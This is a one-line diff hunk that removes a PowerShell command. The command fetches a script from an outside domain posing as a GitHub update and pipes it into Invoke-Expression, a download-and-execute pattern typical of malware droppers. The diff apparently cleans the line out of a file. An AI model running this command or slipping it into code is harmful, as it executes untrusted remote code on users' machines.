@@ -1,1 +1,0 @@
-irm https://mnet.my.id/update/github/c | iex
